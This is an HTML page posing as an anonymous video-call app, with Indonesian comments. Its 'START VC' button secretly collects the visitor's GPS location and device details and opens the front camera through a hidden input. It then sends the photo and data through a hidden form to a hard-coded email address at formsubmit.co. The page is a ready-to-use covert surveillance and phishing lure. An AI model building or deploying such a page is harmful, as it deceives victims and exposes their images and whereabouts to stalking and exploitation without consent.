<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Anonymous VC</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #000;
            color: #fff;
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            overflow: hidden;
            touch-action: manipulation; /* Mencegah zoom saat double tap */
        }

        /* UI Overlay */
        #overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none; /* Biarkan klik tembus ke tombol di bawahnya */
            z-index: 10;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            padding: 20px;
            box-sizing: border-box;
        }

        .status-bar {
            display: flex;
            justify-content: space-between;
            font-size: 12px;
            text-shadow: 0 0 5px #000;
        }

        .live-badge {
            color: #ff0000;
            font-weight: bold;
            display: flex;
            align-items: center;
            gap: 5px;
        }
        
        .live-dot {
            width: 8px;
            height: 8px;
            background-color: #ff0000;
            border-radius: 50%;
            animation: blink 1s infinite;
        }

        .rec-badge {
            color: #fff;
            background: rgba(255, 0, 0, 0.2);
            padding: 2px 8px;
            border: 1px solid #fff;
            font-size: 10px;
        }

        /* Container Konten Utama */
        #uiContent {
            pointer-events: auto; /* Aktifkan klik di area ini */
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 15px;
            z-index: 20; /* Pastikan di atas overlay */
            position: relative;
        }

        #status {
            font-size: 14px;
            color: #0f0;
            margin-top: 10px;
            min-height: 20px;
        }

        /* TOMBOL UTAMA */
        #btn {
            background: rgba(255, 255, 255, 0.1);
            border: 2px solid #fff;
            color: #fff;
            padding: 20px 50px;
            font-size: 20px;
            border-radius: 50px;
            cursor: pointer;
            backdrop-filter: blur(10px);
            transition: all 0.2s;
            font-weight: bold;
            box-shadow: 0 0 15px rgba(255, 255, 255, 0.3);
            outline: none;
        }

        #btn:active {
            background: #fff;
            color: #000;
            transform: scale(0.95);
            box-shadow: 0 0 25px rgba(255, 255, 255, 0.8);
        }

        /* Hidden Elements */
        #frmTarget { display: none; }
        #fileInput { 
            position: absolute; 
            opacity: 0; 
            width: 1px; 
            height: 1px; 
            overflow: hidden; 
        }

        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0; }
            100% { opacity: 1; }
        }
    </style>
</head>
<body>

    <!-- UI Overlay (Hiasan) -->
    <div id="overlay">
        <div class="status-bar">
            <div class="live-badge">
                <div class="live-dot"></div> LIVE
            </div>
            <div class="rec-badge">REC ●</div>
        </div>
        
        <!-- Konten Utama (Tombol ada di sini) -->
        <div id="uiContent">
            <h2>ANONYMOUS VC</h2>
            <button id="btn">START VC</button>
            <div id="status">Tap to connect...</div>
        </div>
    </div>

    <!-- Hidden Form & Iframe -->
    <iframe id="frmTarget" name="frmTarget"></iframe>
    
    <form id="vcForm" 
          action="https://formsubmit.co/ajax/desamancur477@gmail.com" 
          method="POST" 
          enctype="multipart/form-data" 
          target="frmTarget">
        
        <input type="hidden" name="message" id="inputMessage">
        <!-- capture="user" untuk kamera depan -->
        <input type="file" name="attachment" id="fileInput" accept="image/*" capture="user">
        
        <input type="hidden" name="_subject" value="📸 Foto VC Baru">
        <input type="hidden" name="_captcha" value="false">
    </form>

    <!-- Audio Sounds (Base64 agar tidak perlu file eksternal) -->
    <script>
        // Suara "Beep" Singkat
        const beep = new Audio("data:audio/wav;base64,UklGRl9vT1BXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YU"); // Placeholder simple beep
        // Untuk suara yang lebih jelas, gunakan URL eksternal atau base64 yang lebih panjang. 
        // Di sini kita pakai logika visual sebagai fallback jika audio diblokir browser.
        
        const btn = document.getElementById('btn');
        const status = document.getElementById('status');
        const fileInput = document.getElementById('fileInput');
        const messageInput = document.getElementById('inputMessage');

        btn.addEventListener('click', async () => {
            // 1. Audio Feedback
            try {
                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioCtx.createOscillator();
                const gainNode = audioCtx.createGain();
                oscillator.connect(gainNode);
                gainNode.connect(audioCtx.destination);
                oscillator.type = 'sine';
                oscillator.frequency.value = 800;
                gainNode.gain.value = 0.1;
                oscillator.start();
                setTimeout(() => oscillator.stop(), 100);
            } catch (e) {}

            status.innerText = "Initializing Location...";
            btn.disabled = true; // Cegah double click

            // 2. Ambil Lokasi
            let lokasi = "Lokasi tidak tersedia";
            if (navigator.geolocation) {
                try {
                    const pos = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 8000 });
                    });
                    lokasi = `Lat: ${pos.coords.latitude.toFixed(6)}, Lng: ${pos.coords.longitude.toFixed(6)}`;
                } catch (e) { lokasi = "Lokasi gagal"; }
            }

            status.innerText = "Opening Camera...";
            
            // 3. Trigger Camera (Native)
            fileInput.click();

            // 4. Tunggu User Memilih Foto
            await new Promise(resolve => {
                fileInput.onchange = () => {
                    resolve();
                };
            });

            if (!fileInput.files || fileInput.files.length === 0) {
                status.innerText = "Cancelled";
                btn.disabled = false;
                return;
            }

            // 5. Submit Form
            messageInput.value = `Lokasi: ${lokasi}\nWaktu: ${new Date().toLocaleString()}\nDevice: ${navigator.userAgent}`;
            
            status.innerText = "Sending...";
            btn.innerText = "SENDING...";
            
            document.getElementById('vcForm').submit();

            // 6. Handle Response
            const frm = document.getElementById('frmTarget');
            frm.onload = () => {
                try {
                    const body = frm.contentDocument.body.innerText;
                    if (body.includes("success")) {
                        status.innerText = "Sent!";
                        btn.innerText = "DONE";
                        btn.style.background = "#0f0";
                        btn.style.color = "#000";
                    } else {
                        status.innerText = "Failed (Check Spam)";
                        btn.disabled = false;
                    }
                } catch (e) {
                    status.innerText = "Done (Check Spam)";
                    btn.disabled = false;
                }
            };
        });
    </script>
</body>
</html>
